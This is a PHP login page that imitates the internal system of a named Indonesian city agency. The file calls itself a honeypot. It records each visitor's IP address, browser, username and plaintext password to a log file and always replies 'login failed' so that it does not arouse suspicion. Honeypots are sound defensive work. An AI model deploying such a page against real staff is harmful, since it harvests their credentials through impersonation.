<?php
// Jika form dikirim, log data input
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['REMOTE_ADDR'];
    $agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $username = $_POST['username'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $timestamp = date('Y-m-d H:i:s');

    $logData = "[$timestamp] IP: $ip | Agent: $agent | Username: $username | Password: $password\n";
    file_put_contents('honeypot_login_attempts.log', $logData, FILE_APPEND);

    // Tampilkan respon umum agar tidak mencurigakan
    $feedback = "Login gagal. Silakan periksa kembali kredensial Anda.";
} else {
    $feedback = null;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sistem Informasi Internal DLH</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f1f8e9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 6px;
      box-shadow: 0 0 12px rgba(0,0,0,0.08);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .login-box h2 {
      margin-bottom: 1.5rem;
      color: #33691e;
    }

    input {
      width: 90%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 95%;
      padding: 0.8rem;
      background: #558b2f;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 1rem;
    }

    button:hover {
      background: #33691e;
    }

    .notice {
      margin-top: 1rem;
      font-size: 0.8rem;
      color: #666;
    }

    .feedback {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: red;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Masuk Sistem Internal</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="NIP / Email Pegawai" required />
      <input type="password" name="password" placeholder="Kata Sandi" required />
      <button type="submit">Masuk</button>
    </form>
    <?php if ($feedback): ?>
      <p class="feedback"><?= htmlspecialchars($feedback) ?></p>
    <?php endif; ?>
    <p class="notice">Hak akses terbatas. Hanya untuk pegawai DLH Kota Malang.</p>
  </div>

</body>
</html>
